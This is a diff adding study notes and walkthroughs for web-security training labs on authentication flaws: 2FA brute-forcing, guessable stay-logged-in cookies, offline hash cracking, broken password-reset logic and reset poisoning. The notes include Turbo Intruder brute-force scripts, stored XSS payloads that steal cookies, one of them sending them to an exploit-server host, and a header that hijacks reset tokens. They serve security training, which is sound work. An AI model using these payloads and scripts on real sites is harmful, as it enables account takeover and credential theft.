@@ -559,3 +559,308 @@ def handleResponse(req, interesting):
 - I got a 302 response and I copied the code and pasted it in
 - The lab was solved
 
+# Brute-forcing 2FA verification codes
+- As with passwords, websites need to take steps to prevent brute-forcing of the 2FA verification code. 
+- This is especially important because the code is often a simple 4 or 6-digit number. 
+- Without adequate brute-force protection, cracking such a code is trivial.
+- Some websites attempt to prevent this by automatically logging a user out if they enter a certain number of incorrect verification codes. 
+- This is ineffective in practice because an advanced attacker can even automate this multi-step process by creating macros for Burp Intruder. 
+- The Turbo Intruder extension can also be used for this purpose.
+
+# Lab: 2FA bypass using a brute-force attack
+- This lab's two-factor authentication is vulnerable to brute-forcing. 
+- You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. 
+- To solve the lab, brute-force the 2FA code and access Carlos's account page.
+- Victim's credentials: carlos:montoya
+
+- # Note
+- As the verification code will reset while you're running your attack, you may need to repeat this attack several times before you succeed. 
+- This is because the new code may be a number that your current Intruder attack has already attempted.
+
+# Solution
+- With Burp running, log in as carlos and investigate the 2FA verification process. 
+- Notice that if you enter the wrong code twice, you will be logged out again. 
+- You need to use Burp's session handling features to log back in automatically before sending each request.
+- In Burp, click  Settings to open the Settings dialog, then click Sessions. 
+- In the Session Handling Rules panel, click Add. 
+- The Session handling rule editor dialog opens.
+- In the dialog, go to the Scope tab. Under URL Scope, select the option Include all URLs.
+- Go back to the Details tab and under Rule Actions, click Add > Run a macro.
+- Under Select macro click Add to open the Macro Recorder. Select the following 3 requests:
+```
+GET /login
+POST /login
+GET /login2
+```
+- Then click OK. The Macro Editor dialog opens.
+- Click Test macro and check that the final response contains the page asking you to provide the 4-digit security code. 
+- This confirms that the macro is working correctly.
+- Keep clicking OK to close the various dialogs until you get back to the main Burp window. The macro will now automatically log you back in as Carlos before each request is sent by Burp Intruder.
+- Send the POST /login2 request to Burp Turbo Intruder.
+- In Burp Turbo Intruder, add a payload position to the mfa-code parameter by doing %s.
+- Run the following code
+```
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           requestsPerConnection=100,
+                           pipeline=False,
+               engine=Engine.BURP
+                           )
+
+
+    passwords = [p.strip() for p in open('/home/kali/SecLists-master/Fuzzing/4-digits-0000-9999.txt', 'r').readlines()]
+    
+    for password in passwords:
+        engine.queue(target.req, password)
+
+def handleResponse(req, interesting):
+    table.add(req)
+```
+- The Attack is very slow and the session of the user can expire if you are not checking the 302
+- When you see the 302, right click and send the response to browser, If you are lucky you will be logged into carlos account
+- Then lab solved.
+
+# Vulnerabilities in other authentication mechanisms
+- In addition to the basic login functionality, most websites provide supplementary functionality to allow users to manage their account. 
+- For example, users can typically change their password or reset their password when they forget it. 
+- These mechanisms can also introduce vulnerabilities that can be exploited by an attacker.
+- Websites usually take care to avoid well-known vulnerabilities in their login pages. 
+- But it is easy to overlook the fact that you need to take similar steps to ensure that related functionality is equally as robust. 
+- This is especially important in cases where an attacker is able to create their own account and, consequently, has easy access to study these additional pages.
+
+# Keeping users logged in
+- A common feature is the option to stay logged in even after closing a browser session. 
+- This is usually a simple checkbox labeled something like "Remember me" or "Keep me logged in".
+- This functionality is often implemented by generating a "remember me" token of some kind, which is then stored in a persistent cookie. 
+- As possessing this cookie effectively allows you to bypass the entire login process, it is best practice for this cookie to be impractical to guess. 
+- However, some websites generate this cookie based on a predictable concatenation of static values, such as the username and a timestamp. 
+- Some even use the password as part of the cookie. 
+- This approach is particularly dangerous if an attacker is able to create their own account because they can study their own cookie and potentially deduce how it is generated. 
+- Once they work out the formula, they can try to brute-force other users' cookies to gain access to their accounts.
+- Some websites assume that if the cookie is encrypted in some way it will not be guessable even if it does use static values. 
+- While this may be true if done correctly, naively "encrypting" the cookie using a simple two-way encoding like Base64 offers no protection whatsoever. 
+- Even using proper encryption with a one-way hash function is not completely bulletproof. 
+- If the attacker is able to easily identify the hashing algorithm, and no salt is used, they can potentially brute-force the cookie by simply hashing their wordlists. 
+- This method can be used to bypass login attempt limits if a similar limit isn't applied to cookie guesses.
+
+# Lab: Brute-forcing a stay-logged-in cookie
+- This lab allows users to stay logged in even after they close their browser session. 
+- The cookie used to provide this functionality is vulnerable to brute-forcing.
+- To solve the lab, brute-force Carlos's cookie to gain access to his My account page.
+- Your credentials: wiener:peter
+- Victim's username: carlos
+
+# Solution
+- With Burp running, log in to your own account with the Stay logged in option selected. 
+- Notice that this sets a stay-logged-in cookie.
+- Examine this cookie in the Inspector panel and notice that it is Base64-encoded. 
+- Its decoded value is wiener:51dc30ddc473d43a6011e9ebba6ca770. 
+- Study the length and character set of this string and notice that it could be an MD5 hash. 
+- Given that the plaintext is your username, you can make an educated guess that this may be a hash of your password. Hash your password using MD5 to confirm that this is the case. We now know that the cookie is constructed as follows: base64(username+':'+md5HashOfPassword)
+- Log out of your account.
+- In the most recent GET /my-account?id=wiener request highlight the stay-logged-in cookie parameter and send the request to Burp Intruder.
+- In Burp Intruder, notice that the stay-logged-in cookie has been automatically added as a payload position. Add your own password as a single payload.
+- Under Payload processing, add the following rules in order. 
+- These rules will be applied sequentially to each payload before the request is submitted.
+- Hash: MD5
+- Add prefix: wiener:
+- Encode: Base64-encode
+- As the Update email button is only displayed when you access the My account page in an authenticated state, we can use the presence or absence of this button to determine whether we've successfully brute-forced the cookie. 
+- In the  Settings side panel, add a grep match rule to flag any responses containing the string Update email. Start the attack.
+- Notice that the generated payload was used to successfully load your own account page. 
+- This confirms that the payload processing rules work as expected and you were able to construct a valid cookie for your own account.
+- Make the following adjustments and then repeat this attack:
+- Remove your own password from the payload list and add the list of candidate passwords instead.
+- Change the id parameter in the request URL to carlos instead of wiener.
+- Change the Add prefix rule to add carlos: instead of wiener:.
+- When the attack is finished, the lab will be solved. 
+- Notice that only one request returned a response containing Update email. 
+- The payload from this request is the valid stay-logged-in cookie for Carlos's account.
+
+# Continuation
+- Even if the attacker is not able to create their own account, they may still be able to exploit this vulnerability. 
+- Using the usual techniques, such as XSS, an attacker could steal another user's "remember me" cookie and deduce how the cookie is constructed from that. 
+- If the website was built using an open-source framework, the key details of the cookie construction may even be publicly documented.
+- In some rare cases, it may be possible to obtain a user's actual password in cleartext from a cookie, even if it is hashed. 
+- Hashed versions of well-known password lists are available online, so if the user's password appears in one of these lists, decrypting the hash can occasionally be as trivial as just pasting the hash into a search engine. 
+- This demonstrates the importance of salt in effective encryption.
+
+# Lab: Offline password cracking
+- This lab stores the user's password hash in a cookie. 
+- The lab also contains an XSS vulnerability in the comment functionality. 
+- To solve the lab, obtain Carlos's stay-logged-in cookie and use it to crack his password. 
+- Then, log in as carlos and delete his account from the "My account" page.
+- Your credentials: wiener:peter
+- Victim's username: carlos
+
+# My-Solution
+- First I logged in and go to the comment session
+- I tried simple XSS payload and it worked, And I noticed it is a stored XSS
+- So I tried the following payload
+```
+<script>
+    window.addEventListener("DOMContentLoaded", function() {
+        
+        var myform = new FormData();
+
+        myform.append("postId", 2)
+        myform.append("comment", document.cookie)
+        myform.append("name", "You have been hacked")
+        myform.append("email", "bybeejay@email.com")
+        myform.append("website", "https://bybeejay.com")
+
+        fetch("/post/comment", {
+            method: "POST",
+            mode: "no-cors",
+            body: myform
+        })
+    })
+</script>
+```
+- It workd document.cookie were returned And the victim's stay logged in was shown
+- I tried putting the login details in the session but it doesn't work
+- I noticed that the stay logged in is an encoded base64 of carlos:md5hash number
+- I copied the md5 number and went to https://md5decrypt.net/ and pasted it there
+- The plain password was returned to me and I logged in with the password
+- I deleted the password and the lab was solved
+
+# Lab Solution
+- With Burp running, use your own account to investigate the "Stay logged in" functionality. 
+- Notice that the stay-logged-in cookie is Base64 encoded.
+- In the Proxy > HTTP history tab, go to the Response to your login request and highlight the stay-logged-in cookie, to see that it is constructed as follows: username+':'+md5HashOfPassword
+- You now need to steal the victim user's cookie. 
+- Observe that the comment functionality is vulnerable to XSS.
+- Go to the exploit server and make a note of the URL.
+- Go to one of the blogs and post a comment containing the following stored XSS payload, remembering to enter your own exploit server ID:
+```
+<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
+```
+- On the exploit server, open the access log. There should be a GET request from the victim containing their stay-logged-in cookie.
+- Decode the cookie in Burp Decoder. The result will be: carlos:26323c16d5f4dabff3bb136f2460a943
+- Copy the hash and paste it into a search engine. This will reveal that the password is onceuponatime.
+- Log in to the victim's account, go to the "My account" page, and delete their account to solve the lab.
+
+# Resetting user passwords
+- In practice some users will forget their password, so it is common to have a way for them to reset it. 
+- As the usual password-based authentication is obviously impossible in this scenario, websites have to rely on alternative methods to make sure that the real user is resetting their own password. 
+- For this reason, the password reset functionality is inherently dangerous and needs to be implemented securely.
+- There are a few different ways that this feature is commonly implemented, with varying degrees of vulnerability.
+
+# Sending passwords by email
+- It should go without saying that sending users their current password should never be possible if a website handles passwords securely in the first place. 
+- Instead, some websites generate a new password and send this to the user via email.
+- Generally speaking, sending persistent passwords over insecure channels is to be avoided. 
+- In this case, the security relies on either the generated password expiring after a very short period, or the user changing their password again immediately. 
+- Otherwise, this approach is highly susceptible to man-in-the-middle attacks.
+- Email is also generally not considered secure given that inboxes are both persistent and not really designed for secure storage of confidential information. 
+- Many users also automatically sync their inbox between multiple devices across insecure channels.
+
+# Resetting passwords using a URL
+- A more robust method of resetting passwords is to send a unique URL to users that takes them to a password reset page. 
+- Less secure implementations of this method use a URL with an easily guessable parameter to identify which account is being reset, for example: http://vulnerable-website.com/reset-password?user=victim-user
+- In this example, an attacker could change the user parameter to refer to any username they have identified. 
+- They would then be taken straight to a page where they can potentially set a new password for this arbitrary user.
+- A better implementation of this process is to generate a high-entropy, hard-to-guess token and create the reset URL based on that. 
+- In the best case scenario, this URL should provide no hints about which user's password is being reset.
+```
+http://vulnerable-website.com/reset-password?token=a0ba0d1cb3b63d13822572fcff1a241895d893f659164d4cc550b421ebdd48a8
+```
+- When the user visits this URL, the system should check whether this token exists on the back-end and, if so, which user's password it is supposed to reset. 
+- This token should expire after a short period of time and be destroyed immediately after the password has been reset.
+- However, some websites fail to also validate the token again when the reset form is submitted. 
+- In this case, an attacker could simply visit the reset form from their own account, delete the token, and leverage this page to reset an arbitrary user's password.
+
+# Lab: Password reset broken logic
+- This lab's password reset functionality is vulnerable. To solve the lab, reset Carlos's password then log in and access his "My account" page.
+- Your credentials: wiener:peter
+- Victim's username: carlos
+
+# Solution
+- With Burp running, click the Forgot your password? link and enter your own username.
+- Click the Email client button to view the password reset email that was sent. Click the link in the email and reset your password to whatever you want.
+- In Burp, go to Proxy > HTTP history and study the requests and responses for the password reset functionality. 
+- Observe that the reset token is provided as a URL query parameter in the reset email. 
+- Notice that when you submit your new password, the POST /forgot-password?temp-forgot-password-token request contains the username as hidden input. 
+- Send this request to Burp Repeater.
+- In Burp Repeater, observe that the password reset functionality still works even if you delete the value of the temp-forgot-password-token parameter in both the URL and request body. 
+- This confirms that the token is not being checked when you submit the new password.
+- In the browser, request a new password reset and change your password again. Send the POST /forgot-password?temp-forgot-password-token request to Burp Repeater again.
+- In Burp Repeater, delete the value of the temp-forgot-password-token parameter in both the URL and request body. 
+- Change the username parameter to carlos. Set the new password to whatever you want and send the request.
+- In the browser, log in to Carlos's account using the new password you just set. Click My account to solve the lab.
+
+# Continuation
+- If the URL in the reset email is generated dynamically, this may also be vulnerable to password reset poisoning. 
+- In this case, an attacker can potentially steal another user's token and use it change their password.
+
+# Lab: Password reset poisoning via middleware
+- This lab is vulnerable to password reset poisoning. 
+- The user carlos will carelessly click on any links in emails that he receives. 
+- To solve the lab, log in to Carlos's account. 
+- You can log in to your own account using the following credentials: wiener:peter. 
+- Any emails sent to this account can be read via the email client on the exploit server.
+
+# Soolution
+- With Burp running, investigate the password reset functionality. Observe that a link containing a unique reset token is sent via email.
+- Send the POST /forgot-password request to Burp Repeater. 
+- Notice that the X-Forwarded-Host header is supported and you can use it to point the dynamically generated reset link to an arbitrary domain.
+- Go to the exploit server and make a note of your exploit server URL.
+- Go back to the request in Burp Repeater and add the X-Forwarded-Host header with your exploit server URL: 
+```
+X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
+```
+- Change the username parameter to carlos and send the request.
+- Go to the exploit server and open the access log. 
+- You should see a GET /forgot-password request, which contains the victim's token as a query parameter. Make a note of this token.
+- Go back to your email client and copy the valid password reset link (not the one that points to the exploit server). 
+- Paste this into the browser and change the value of the temp-forgot-password-token parameter to the value that you stole from the victim.
+- Load this URL and set a new password for Carlos's account.
+- Log in to Carlos's account using the new password to solve the lab.
+
+# Lab: Password brute-force via password change
+- This lab's password change functionality makes it vulnerable to brute-force attacks. 
+- To solve the lab, use the list of candidate passwords to brute-force Carlos's account and access his "My account" page.
+- Your credentials: wiener:peter
+- Victim's username: carlos
+
+# Solution
+- With Burp running, log in and experiment with the password change functionality. Observe that the username is submitted as hidden input in the request.
+- Notice the behavior when you enter the wrong current password. 
+- If the two entries for the new password match, the account is locked. 
+- However, if you enter two different new passwords, an error message simply states Current password is incorrect. 
+- If you enter a valid current password, but two different new passwords, the message says New passwords do not match. 
+- We can use this message to enumerate correct passwords.
+- Enter your correct current password and two new passwords that do not match. 
+- Send this POST /my-account/change-password request to Burp Turbo Intruder.
+- In Burp Turbo Intruder, change the username parameter to carlos and add a payload position to the current-password parameter. 
+- Make sure that the new password parameters are set to two different values. For example:
+```
+username=carlos&current-password=%s&new-password-1=123&new-pas
+```
+- Run this code 
+```
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=10,
+                           requestsPerConnection=100,
+                           pipeline=False
+                           )
+
+
+ 
+    passwords = open('/home/kali/password').read().splitlines()
+
+    
+    for password in passwords:
+        engine.queue(target.req, password)
+           
+
+
+def handleResponse(req, interesting):
+    if req.status != 404:
+        table.add(req)
+```
+
+- Find the reponse with "New Password Do not Match"
+- Log in to carlos page to solve the lab
